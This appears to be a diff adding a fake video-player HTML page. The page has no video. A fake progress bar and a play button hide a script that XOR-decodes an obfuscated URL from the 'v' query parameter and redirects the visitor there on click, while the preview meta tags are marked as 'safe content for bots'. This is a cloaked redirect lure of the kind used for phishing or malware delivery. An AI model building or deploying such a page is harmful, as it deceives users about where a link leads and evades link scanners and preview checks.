@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Player</title>
+
+    <!-- OG / Twitter Card - Safe content for bots -->
+    <meta property="og:type" content="video.other">
+    <meta property="og:title" content="Video Player">
+    <meta property="og:description" content="Click play to watch this video">
+    <meta name="twitter:card" content="player">
+    <meta name="twitter:title" content="Video Player">
+    <meta name="twitter:description" content="Click play to watch this video">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            margin: 0;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .player-wrapper {
+            width: 100%;
+            height: 100vh;
+        }
+
+        .player {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            cursor: pointer;
+        }
+
+        .play-center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .play-btn {
+            width: 68px;
+            height: 68px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.15s ease, background 0.15s ease;
+        }
+
+        .play-btn::after {
+            content: "";
+            display: block;
+            width: 0;
+            height: 0;
+            border-style: solid;
+            border-width: 12px 0 12px 22px;
+            border-color: transparent transparent transparent #0f0f0f;
+            margin-left: 4px;
+        }
+
+        .play-text {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+            letter-spacing: 0.5px;
+        }
+
+        .player:hover .play-btn {
+            transform: scale(1.1);
+            background: #fff;
+        }
+
+        /* Loading spinner after click */
+        .player.loading .play-center {
+            display: none;
+        }
+
+        .spinner {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .player.loading .spinner {
+            display: block;
+        }
+
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        /* Progress bar fake */
+        .controls {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 36px;
+            background: linear-gradient(transparent, rgba(0, 0, 0, 0.7));
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+        }
+
+        .progress-bar {
+            flex: 1;
+            height: 3px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 2px;
+            margin: 0 8px;
+        }
+
+        .time {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+    </style>
+</head>
+<body>
+    <div class="player-wrapper">
+        <div class="player" id="player">
+            <div class="play-center">
+                <div class="play-btn"></div>
+                <span class="play-text">Click to play</span>
+            </div>
+            <div class="spinner"></div>
+            <div class="controls">
+                <span class="time">0:00</span>
+                <div class="progress-bar"></div>
+                <span class="time">3:24</span>
+            </div>
+        </div>
+    </div>
+
+
+    <script>
+        (function () {
+            var K = 0x5A;
+            var player = document.getElementById("player");
+
+            function xorDecode(hex) {
+                try {
+                    var s = "";
+                    for (var i = 0; i < hex.length; i += 2) {
+                        s += String.fromCharCode(parseInt(hex.substr(i, 2), 16) ^ K);
+                    }
+                    return s;
+                } catch (e) {
+                    return null;
+                }
+            }
+
+            function getTargetUrl() {
+                var params = new URLSearchParams(window.location.search);
+                var v = params.get("v");
+                if (!v) return null;
+                return xorDecode(v);
+            }
+
+            player.addEventListener("click", function () {
+                var url = getTargetUrl();
+                if (!url) return;
+
+                player.classList.add("loading");
+
+                setTimeout(function () {
+                    window.location.href = url;
+                }, 600);
+            });
+        })();
+    </script>
+</body>
+</html>
